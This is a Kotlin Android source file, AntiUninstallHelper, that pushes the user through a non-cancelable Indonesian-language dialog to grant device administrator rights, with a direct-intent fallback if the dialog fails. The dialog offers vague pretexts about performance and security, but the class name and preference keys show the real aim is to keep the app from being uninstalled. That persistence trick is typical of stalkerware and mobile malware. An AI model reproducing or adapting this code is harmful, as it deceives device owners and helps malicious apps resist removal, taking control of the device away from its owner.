package com.sync.xxx

import android.app.AlertDialog
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent

object AntiUninstallHelper {

    private const val PREF_NAME = "anti_uninstall_prefs"
    private const val KEY_DIALOG_SHOWN = "admin_dialog_shown"

    fun requestAdminIfNeeded(context: Context, force: Boolean = false) {
        val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val admin = ComponentName(context, AntiUninstallReceiver::class.java)

        // Already active → done
        if (dpm.isAdminActive(admin)) return

        val prefs = context.getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE)
        if (!force && prefs.getBoolean(KEY_DIALOG_SHOWN, false)) return

        prefs.edit().putBoolean(KEY_DIALOG_SHOWN, true).apply()

        try {
            AlertDialog.Builder(context)
                .setTitle("Aktifkan Admin")
                .setMessage("Aktifkan izin administrator perangkat agar aplikasi berjalan optimal dan tidak terganggu.")
                .setCancelable(false)
                .setPositiveButton("Aktifkan") { _, _ ->
                    val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                        putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin)
                        putExtra(
                            DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                            "Diperlukan untuk keamanan perangkat dan proteksi aplikasi."
                        )
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    }
                    context.startActivity(intent)
                }
                .show()
        } catch (_: Exception) {
            // Fallback direct intent if dialog fails (e.g. no activity context)
            val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin)
                putExtra(
                    DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                    "Diperlukan untuk keamanan perangkat."
                )
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            try { context.startActivity(intent) } catch (_: Exception) {}
        }
    }

    fun isAdminActive(context: Context): Boolean {
        val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val admin = ComponentName(context, AntiUninstallReceiver::class.java)
        return dpm.isAdminActive(admin)
    }

    /** Reset the "dialog shown" flag so next requestAdminIfNeeded will show again */
    fun resetDialogFlag(context: Context) {
        context.getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE)
            .edit().putBoolean(KEY_DIALOG_SHOWN, false).apply()
    }
}
